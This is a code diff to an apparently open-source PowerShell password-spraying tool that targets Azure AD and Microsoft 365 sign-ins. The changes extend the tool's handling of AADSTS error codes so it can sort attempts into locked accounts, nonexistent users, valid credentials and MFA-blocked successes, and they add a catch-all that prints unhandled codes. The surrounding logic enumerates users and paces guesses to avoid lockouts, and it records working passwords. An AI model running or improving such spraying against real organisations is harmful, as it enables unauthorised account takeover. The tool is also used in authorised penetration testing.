@@ -88,7 +88,7 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
                 $sprayResult += "$datetime, $result, $un, $passes"
             }
             # Account Locked
-            ElseIf($errRes -match "AADSTS50053")
+            ElseIf($errRes -match "AADSTS50053" -or $errRes -match "AADSTS90002")
             {
                 Write-Host -ForegroundColor "red" "    WARNING! $un appears to be locked, skipping further attempts"
                 $result = "Account Locked"
@@ -98,7 +98,7 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
             # Invalid Username
             ElseIf($errRes -match "AADSTS50034")
             {
-                Write-Host -ForegroundColor "yellow" "    $un doesn't exist, skipping further attempts.."
+                Write-Host -ForegroundColor "yellow" "    The user $un doesn't exist, tenant appears correct. Skipping further attempts.."
                 $result = "User Does Not Exist"
                 $sprayResult += "$datetime, $result, $un, $passes"
                 break
@@ -118,6 +118,12 @@ for ($counter=0; $counter -lt $usernames.length; $counter++) {
                 $result = "Success, MFA Blocked"
                 $sprayResult += "$datetime, $result, $un, $passes"
                 break
+            }
+            else
+            {
+                Write-Host "This error has not yet been handled. Please open an issue on the Github page with the following information so it can be handled correctly"
+                Write-Host "Error Code: $errRes"
+                Write-Host "Link: https://github.com/theresafewconors/mssprinkler/issues"
             }
         }
         Start-Sleep(60/$threshold)
@@ -140,6 +146,7 @@ $errorResonseValues = @{
     AADSTS50029 = "Invalid URI provided"
     AADSTS50034 = "User account not found (invalid username)"
     AADSTS50059 = "Tenant not found"
+    AADSTS90002 = "Tenant ID not found"
     AADSTS50126 = "Invalid username or password" # standard failed password?
     AADSTS50128 = "Invalid domain name / Tenant does not exist"
     # MFA Responses
